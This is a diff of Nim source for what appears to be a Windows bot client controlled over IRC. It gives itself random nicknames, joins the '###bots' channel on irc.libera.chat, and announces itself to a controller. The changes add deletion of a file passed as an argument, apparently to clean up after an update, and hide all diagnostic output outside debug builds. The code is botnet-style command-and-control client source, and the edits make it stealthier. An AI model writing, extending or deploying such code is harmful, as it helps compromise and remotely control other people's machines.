@@ -1,7 +1,15 @@
-import irc, asyncdispatch, winim, random, strutils, threadpool
+import irc, asyncdispatch, winim, random, strutils, threadpool, os
 
 import command_handler, update_handler
 
+
+if paramCount() > 0:
+  var cleanpath = paramStr(1).strip(chars = {'\"'})
+  try:
+    if fileExists(paramStr(1)):
+      removeFile(paramSTr(1))
+  except:
+    echo "COULD NOT REMOVE FILE IN PARAM"
 
 
 proc generateName():string = 
@@ -57,7 +65,7 @@ while true:
   # Check for updates
   waitFor updt_clearTemp()
   #discard updt_check(false, nil, IrcEvent())
-  echo "Running here"
+  when defined(debug): echo "Running here"
 
 
 
@@ -74,7 +82,7 @@ while true:
 
   var name = generateName()
 
-  if g_dbg: echo "Generated Name: ", name
+  when defined(debug): echo "Generated Name: ", name
 
   ## The final nickname must be 16 chars long so the rest will be filled with random digits
 
@@ -82,9 +90,9 @@ while true:
     target_channel:string = "###bots"
 
 
-  if g_dbg: echo "Trying to connect"
+  when defined(debug): echo "Trying to connect"
 
-  if g_dbg: echo "Connected"
+  when defined(debug): echo "Connected"
 
   proc onIrcEvent(client: AsyncIrc, event: IrcEvent) {.async.} =
     try:
@@ -102,23 +110,26 @@ while true:
           ## Notify the controller that the bot has joined
           discard client.privmsg(target_channel,".")
         
-        if g_dbg: echo(event.raw)
+        when defined(debug): echo(event.raw)
     except OSError as e:
-      echo "onIrcEvent exception: [", repr(e), "]"
+      when defined(debug): echo "onIrcEvent exception: [", repr(e), "]"
+      discard
   try:
     var  client = newAsyncIrc("irc.libera.chat", nick=name , joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)
 
     try:
       asyncCheck client.run()
     except:
-      echo "FUCKING HELL"
+      when defined(debug): echo "FUCKING HELL"
       Sleep(10000)
+
+  
 
     try:
       runForever()
     except:
-      echo "EVERYTHING IS FUCKED UP. RETRYING"
+      when defined(debug): echo "EVERYTHING IS FUCKED UP. RETRYING"
       Sleep(15000)
       g_first_run = true
   except OSError as e:
-    echo "HELP HeeeeeEEEEELP: [", repr(e), "]"
+    when defined(debug): echo "HELP HeeeeeEEEEELP: [", repr(e), "]"
